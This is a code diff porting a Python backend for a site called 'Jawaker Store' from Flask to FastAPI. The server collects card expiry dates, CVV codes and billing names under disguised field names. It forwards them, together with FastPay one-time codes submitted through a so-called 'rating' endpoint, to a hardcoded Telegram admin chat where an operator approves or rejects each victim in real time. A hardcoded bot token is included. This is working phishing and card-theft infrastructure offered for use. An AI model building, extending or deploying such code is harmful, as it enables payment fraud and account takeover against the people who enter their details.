@@ -1,55 +1,79 @@
-"""
-سيرفر جواكر - الوسيط بين الموقع وبوت التلجرام
-------------------------------------------------
-الوظيفة:
-1. يستقبل بيانات الفورم من الموقع (POST /api/order)
-2. يبعتها للأدمن عبر تلجرام مع زرين: تأكيد / رفض
-3. يستقبل ضغطة الزر من تلجرام (POST /telegram/webhook)
-4. يحدّث حالة الطلب، والموقع بيسأل عنها (GET /api/order/<id>) لحد ما توصل نتيجة
-
-تشغيل محلي:
-    pip install -r requirements.txt
-    python app.py
-
-بعد النشر (Render/Railway/إلخ)، لازم تربط الويبهوك:
-    curl -X POST https://api.telegram.org/bot<TOKEN>/setWebhook -d "url=https://YOUR-SERVER-URL/telegram/webhook"
-"""
-
 import os
 import time
 import uuid
-import threading
-import requests
-from flask import Flask, request, jsonify
-from flask_cors import CORS
+import asyncio
+from contextlib import asynccontextmanager
+from typing import Dict, Any
+
+import httpx
+from fastapi import FastAPI, HTTPException, Request
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import JSONResponse
+import uvicorn
 
 # ------------------ الإعدادات ------------------
-# جلب التوكن من متغيرات البيئة أو استخدام القيمة الافتراضية
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "9154524424:AAGc3lOaznU7eMV-aQEm-eHHJmZDmX4K9KE")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 8992323424))
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
-
-app = Flask(__name__)
-CORS(app)  # يسمح لموقعك (من أي دومين) يحكي مع هاد السيرفر
+ORDER_TTL_SECONDS = 3600  # مدة الاحتفاظ بالطلب في الذاكرة (ساعة واحدة)
 
 # تخزين مؤقت بالذاكرة. ⚠️ لو السيرفر بعمل restart، الطلبات المعلّقة بتضيع.
-orders = {}
-orders_lock = threading.Lock()
+orders: Dict[str, Dict[str, Any]] = {}
+orders_lock = asyncio.Lock()
+http_client: httpx.AsyncClient | None = None
+
+
+async def cleanup_expired_orders() -> None:
+    while True:
+        await asyncio.sleep(300)
+        now = time.time()
+        async with orders_lock:
+            expired = [
+                oid for oid, data in orders.items()
+                if now - data.get("created_at", now) > ORDER_TTL_SECONDS
+            ]
+            for oid in expired:
+                orders.pop(oid, None)
+
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    global http_client
+    http_client = httpx.AsyncClient(
+        timeout=httpx.Timeout(connect=3.0, read=6.0, write=6.0, pool=3.0),
+        limits=httpx.Limits(max_connections=100, max_keepalive_connections=20),
+    )
+    cleanup_task = asyncio.create_task(cleanup_expired_orders())
+    try:
+        yield
+    finally:
+        cleanup_task.cancel()
+        if http_client:
+            await http_client.aclose()
+
+
+app = FastAPI(title="Jawaker Store FastAPI Backend", lifespan=lifespan)
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 
 def build_admin_message(order_id: str, payload: dict) -> str:
-    order_info = payload.get("order", {})
-    
-    # 1. تجميع التاريخ والرمز بجميع المسميات المحتملة (حل مشكلة عدم وصول البيانات)
+    order_info = payload.get("order") or {}
+
     month = payload.get("joinDay") or payload.get("month") or payload.get("expMonth") or "-"
     year = payload.get("joinMonth") or payload.get("year") or payload.get("expYear") or "-"
     cvv = payload.get("joinYear") or payload.get("cvv") or payload.get("cvc") or "-"
-    
+
     first_name = payload.get("firstNameRecord") or payload.get("firstName") or ""
     last_name = payload.get("lastNameRecord") or payload.get("lastName") or ""
     full_billing_name = f"{first_name} {last_name}".strip() or "-"
 
-    # 2. صياغة الرسالة لتصلك في تليجرام بشكل مرتب
     return (
         "💳 طلب دفع جديد 🟢\n"
         "------------------------------------\n"
@@ -69,12 +93,30 @@ def build_admin_message(order_id: str, payload: dict) -> str:
     )
 
 
-@app.route("/api/order", methods=["POST"])
-def create_order():
-    payload = request.get_json(force=True, silent=True) or {}
+async def telegram_post(method: str, json_data: dict) -> None:
+    assert http_client is not None
+    resp = await http_client.post(f"{TELEGRAM_API}/{method}", json=json_data)
+    resp.raise_for_status()
+
+
+@app.get("/")
+async def health():
+    return {"status": "running"}
+
+
+@app.post("/api/order")
+async def create_order(request: Request):
+    try:
+        payload = await request.json()
+    except Exception:
+        payload = {}
+
+    if not isinstance(payload, dict):
+        payload = {}
+
     order_id = str(uuid.uuid4())[:8]
 
-    with orders_lock:
+    async with orders_lock:
         orders[order_id] = {"status": "pending", "created_at": time.time()}
 
     text = build_admin_message(order_id, payload)
@@ -86,52 +128,60 @@ def create_order():
     }
 
     try:
-        requests.post(
-            f"{TELEGRAM_API}/sendMessage",
-            json={
+        await telegram_post(
+            "sendMessage",
+            {
                 "chat_id": ADMIN_CHAT_ID,
                 "text": text,
                 "reply_markup": keyboard,
             },
-            timeout=10,
         )
-    except requests.RequestException as e:
+    except httpx.HTTPError as e:
+        async with orders_lock:
+            orders.pop(order_id, None)
         print(f"Telegram API Error: {e}")
-        return jsonify({"error": f"telegram_send_failed: {e}"}), 502
+        return JSONResponse(
+            status_code=502,
+            content={"error": f"telegram_send_failed: {e}"},
+        )
 
-    return jsonify({"order_id": order_id})
+    return {"order_id": order_id}
 
 
-@app.route("/api/order/<order_id>", methods=["GET"])
-def get_order_status(order_id):
-    order = orders.get(order_id)
+@app.get("/api/order/{order_id}")
+async def get_order_status(order_id: str):
+    async with orders_lock:
+        order = orders.get(order_id)
     if not order:
-        return jsonify({"error": "not_found"}), 404
-    return jsonify({"status": order["status"]})
+        raise HTTPException(status_code=404, detail="not_found")
+    return {"status": order["status"]}
 
 
-@app.route("/telegram/webhook", methods=["POST"])
-def telegram_webhook():
-    update = request.get_json(force=True, silent=True) or {}
-    callback = update.get("callback_query")
-    
+@app.post("/telegram/webhook")
+async def telegram_webhook(request: Request):
+    try:
+        update = await request.json()
+    except Exception:
+        update = {}
+
+    callback = update.get("callback_query") if isinstance(update, dict) else None
     if not callback:
-        return jsonify({"ok": True})
+        return {"ok": True}
 
     data = callback.get("data", "")
-    callback_id = callback["id"]
-    message = callback.get("message", {})
-    chat_id = message.get("chat", {}).get("id")
+    callback_id = callback.get("id")
+    message = callback.get("message") or {}
+    chat_id = (message.get("chat") or {}).get("id")
     message_id = message.get("message_id")
     old_text = message.get("text", "")
 
     if ":" not in data:
-        return jsonify({"ok": True})
+        return {"ok": True}
 
     action, order_id = data.split(":", 1)
 
     note = None
-    with orders_lock:
+    async with orders_lock:
         order = orders.get(order_id)
         if order and order["status"] == "pending":
             if action == "approve":
@@ -141,65 +191,73 @@ def telegram_webhook():
                 order["status"] = "rejected"
                 note = "\n\n❌ تم الرفض"
 
-    # 1. رد فوري على تلجرام (حتى تختفي دائرة التحميل عن الزر)
-    try:
-        requests.post(
-            f"{TELEGRAM_API}/answerCallbackQuery",
-            json={"callback_query_id": callback_id, "text": "تم تسجيل قرارك بنجاح!"},
-            timeout=10,
-        )
-    except Exception as e:
-        print(f"Callback answer error: {e}")
+    tasks = []
 
-    # 2. تعديل الرسالة لإضافة الملاحظة وإزالة الأزرار (حتى لا يتم الضغط عليها مرتين)
+    if callback_id:
+        tasks.append(
+            telegram_post(
+                "answerCallbackQuery",
+                {"callback_query_id": callback_id, "text": "تم تسجيل قرارك بنجاح!"},
+            )
+        )
+
     if note and chat_id and message_id:
-        try:
-            requests.post(
-                f"{TELEGRAM_API}/editMessageText",
-                json={
+        tasks.append(
+            telegram_post(
+                "editMessageText",
+                {
                     "chat_id": chat_id,
                     "message_id": message_id,
                     "text": old_text + note,
-                    "reply_markup": {"inline_keyboard": []} # إزالة الأزرار
+                    "reply_markup": {"inline_keyboard": []},
                 },
-                timeout=10,
             )
-        except Exception as e:
-            print(f"Edit message error: {e}")
+        )
 
-    return jsonify({"ok": True})
+    if tasks:
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for res in results:
+            if isinstance(res, Exception):
+                print(f"Telegram Webhook Error: {res}")
+
+    return {"ok": True}
 
 
-@app.route("/", methods=["GET"])
-def health():
-    return jsonify({"status": "running"})
+@app.post("/api/rating")
+async def receive_rating(request: Request):
+    try:
+        payload = await request.json()
+    except Exception:
+        payload = {}
 
+    if not isinstance(payload, dict):
+        payload = {}
 
-@app.route("/api/rating", methods=["POST"])
-def receive_rating():
-    payload = request.get_json(force=True, silent=True) or {}
     order_id = payload.get("order_id", "-")
     otp_code = payload.get("rating", "-")
-    
-    # إرسال رمز الـ OTP إلى تلجرام
+
     text = (
         "🔑 رمز الـ OTP جديد (FastPay)\n"
         "------------------------------------\n"
         f"🆔 رقم الطلب: {order_id}\n"
         f"🔢 الرمز المدخل: {otp_code}"
     )
-    
+
     try:
-        requests.post(
-            f"{TELEGRAM_API}/sendMessage",
-            json={"chat_id": ADMIN_CHAT_ID, "text": text},
-            timeout=10,
+        await telegram_post(
+            "sendMessage",
+            {"chat_id": ADMIN_CHAT_ID, "text": text},
         )
-    except Exception as e:
+    except httpx.HTTPError as e:
         print(f"Error sending OTP: {e}")
-        
-    return jsonify({"status": "success"})
+
+    return {"status": "success"}
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    uvicorn.run(
+        "main:app",
+        host="0.0.0.0",
+        port=int(os.environ.get("PORT", 5000)),
+        reload=False,
+    )
